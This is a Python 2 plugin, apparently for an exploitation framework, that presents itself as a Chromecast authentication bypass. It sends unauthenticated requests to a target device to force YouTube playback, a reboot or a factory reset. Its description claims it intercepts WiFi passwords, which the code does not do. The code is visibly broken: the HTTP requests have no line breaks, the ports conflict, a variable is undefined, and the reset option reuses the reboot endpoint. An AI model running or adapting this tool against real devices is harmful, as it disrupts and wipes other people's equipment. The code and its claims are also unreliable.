Description = 'Bypass authentication on the chromecast and gain control of user interface'

# -*- coding: utf-8 -*-

import re
import sys
import socket
import requests
import httplib
import string
import time
import random
import sys
import os
import logging
from lxml import etree
from urlparse import urlparse
from struct import pack

plugin_description = "The vulnerability is easily exploited and deployed quickly. It bypasses authentication; allowing the attacker to take control of chromecast settings and user interface. This allows any attacker to intercept data from its victims without them knowing; including but not limited to the chromecast access point and saved user settings such as WiFi passwords."
shelly = "shellcode"
intname = "rsf"
det = sys.argv[0]
dala = det.split('.')[-2]
fin = dala.split('plugins/')[-1]
__plugin__      = "%s.plugin" % (fin)
RescoursesDir = os.getcwd()
dandtime = time.strftime("%H:%M:%S")
logfile = "%s/storage/logs/%s.log" % (RescoursesDir,dandtime)

class Tee(object):
  def __init__(self):
    self.file = open(logfile, 'a')
    self.stdout = sys.stdout

  def __del__(self):
    sys.stdout = self.stdout
    self.file.close()

  def write(self, data):
    self.file.write(data)
    self.stdout.write(data)

sys.stdout = Tee()

tree = etree.parse("storage/logs/config.xml")
for user in tree.xpath("/configuration/config/default_target"):
	ip = "%s" % (user.text)

def dash():
    while True:
        line_1 = "" + intname + "(\033[1;31m" + fin + "\033[1;m) > "
        terminal = raw_input(line_1).lower()
        time.sleep(0.5)
        if terminal == 'help':
            print "\n"
            print "Core Commands"
            print "============="
            print ""
            print "  Command         Description"
            print "  -------         -----------"
            print "  help            show help menu"
            print "  execute         run the plugin"
            print "  exit            exit the current plugin"
            print "  info            show plugin description"
            print ""
        elif terminal == 'execute':
            aner()
        elif terminal == "info":
            print plugin_description
            dash()
        elif terminal == 'exit':
            exit()
        else:
            print "Unknown syntax: %s" % (terminal)

def aner():
    defurl = "https://youtube.com/watch?v=dQw4w9WgXcQ"
    default8 = "0"
    time.sleep(0.2)
    print "\033[1;94m[?]\033[1;m Function :: Attack method on chromecast"
    print ""
    print "*0) Youtube"
    print " 1) Reboot"
    print " 2) Factory Reset"
    print ""
    function = raw_input('\033[1;92m[+]\033[1;m function: [' + default8 + ']: ') or default8
    yen = "yes"
    et = "yes"
    print "\033[1;94m[?]\033[1;m Configuring Plugin"
    time.sleep(1)
    print ""
    print "Name             Set Value"
    print "----             ----------"
    print "TargetIp         %s" % (ip)
    if function == "0":
        print "Method           Youtube"
    elif function == "1":
        print "Method           Reboot"
    elif function == "2":
        print "Method           FReset"
    else:
        pass
    print "Plugin           %s" % (fin)
    print "\n"
    et = raw_input("\033[1;94m[?]\033[1;m Execute Plugins? [" + yen + "]: ")  or yen
    if et == 'yes':
        if function == "0":
            print "\033[1;94m[?]\033[1;m URL :: Enter youtube url"
            url = raw_input('\033[1;92m[+]\033[1;m url: [' + defurl + ']: ') or defurl
            final_url = url.split("/")[-1]
            target_host = ip
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (target_host, 8080)
            sock.connect(server_address)
            message = "POST /apps/YouTube HTTP/1.1"
            message += "Host: " + target_host + ":8008"
            message += """User-Agent: _0K!L*`t.I_CP&OOz_OkqNcfQ%5BkP3U]m<o\'"""
            message += "Content-Type:application/x-www-form-urlencode"
            message += "Content-Length:%s" % (final_url)
            message += ""
            message += "%s" % (final_url)
            sock.send(message)
            data = sock.recv(1024)
            print "[\033[1;92m*\033[1;m] Recieved : " + data.strip()
            sock.send(soap)
            data = sock.recv(1024)
            data += sock.recv(1024)
            print "[\033[1;92m*\033[1;m] Exploit sent."
            sock.close()
        if function == "1":
            target_host = ip
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (target_host, 8080)
            sock.connect(server_address)
            message = "POST /setup/reboot HTTP/1.1"
            message += "Host: " + target_host + ":8008"
            message += """User-Agent: _0K!L*`t.I_CP&OOz_OkqNcfQ%5BkP3U]m<o\'"""
            message += "Content-Type: application/json"
            message += "Content-Length: 17"
            message += ""
            message += "{\"params\": \"now\"}"
            sock.send(message)
            data = sock.recv(1024)
            print "[\033[1;92m*\033[1;m] Recieved : " + data.strip()
            sock.send(soap)
            data = sock.recv(1024)
            data += sock.recv(1024)
            print "[\033[1;92m*\033[1;m] Exploit sent."
            sock.close()
        if function == "2":
            target_host = ip
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (target_host, 8080)
            sock.connect(server_address)
            message = "POST /setup/reboot HTTP/1.1"
            message += "Host: " + target_host + ":8008"
            message += """User-Agent: _0K!L*`t.I_CP&OOz_OkqNcfQ%5BkP3U]m<o\'"""
            message += "Content-Type: application/json"
            message += "Content-Length: 17"
            message += ""
            message += "{\"params\": \"fdr\"}"
            sock.send(message)
            data = sock.recv(1024)
            print "[\033[1;92m*\033[1;m] Recieved : " + data.strip()
            sock.send(soap)
            data = sock.recv(1024)
            data += sock.recv(1024)
            print "[\033[1;92m*\033[1;m] Exploit sent."
            sock.close()
    elif et == 'no':
        print "Goodbye ;("
        sys.exit()
    else:
        print "\033[1;92m[!] No options were chosen.\033[1;m"


dash()
